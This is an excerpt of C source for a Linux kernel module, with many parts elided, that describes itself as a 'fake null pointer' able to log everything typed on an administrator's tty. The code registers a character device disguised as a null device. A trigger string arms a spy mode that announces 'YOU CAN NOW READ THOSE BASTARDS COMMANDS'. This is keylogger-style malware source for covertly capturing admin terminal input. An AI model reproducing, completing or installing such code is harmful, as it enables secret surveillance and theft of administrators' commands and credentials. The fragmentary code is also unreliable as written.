...
MODULE_LICENSE ("GPL");
MODULE_DESCRIPTION (
    "Fake null pointer that can log everything you write on admins tty.");
...
static struct file_operations fops = {
  .read = dev_read, .write = dev_write, .release = dev_getrid, .open = dev_open
};

static int
dev_open (struct inode *nod, struct file *filp)
{
...
static ssize_t
dev_read (struct file *filp, char *buf, size_t len, loff_t *offset)
{
  return 0;
}

static ssize_t
dev_write (struct file *filp, const char *buf, size_t len, loff_t *offset)
{
  ...
  if (debugmod)
    printk (KERN_ALERT
            "NULL MOD: Received commands from special file with minor %d: \n",
            current_minor);
  ...
  if (len == strlen (start_spy) && strcmp ((char *)data, start_spy) == 0)
    {
      sprintf (msguser,
               "GOT IT. YOU CAN NOW READ THOSE BASTARDS COMMANDS!\r\n");
      command = msguser;
  ...
  command = msguser;
  write_cur_tty (curtty, &command, 40);
  // An importent stage is here. Setting up the pointer to the entered data for
  // admin when file is tapped.
...
static int
dev_getrid (struct inode *nod, struct file *filp)
{
...
void
write_cur_tty (struct tty_struct *thetty, void **command, int sleeptime)
{
  if (thetty != NULL)
    {
      int i = 0;
...
startpoint (void)
{
  ...
  if ((register_res = register_chrdev (major_num, dev_name, &fops)) > 0
      && major_num == 0)
    {
      major_num = register_res;
      if (debugmod)
        printk ("NULL MOD: Successfully registered the char device %s with "
                "major number: %d\n",
                dev_name, major_num);
    }
    ...
    {
      if (debugmod)
        printk ("NULL MOD: Problem in registering the char device %s. Return "
                "is: %d\n",
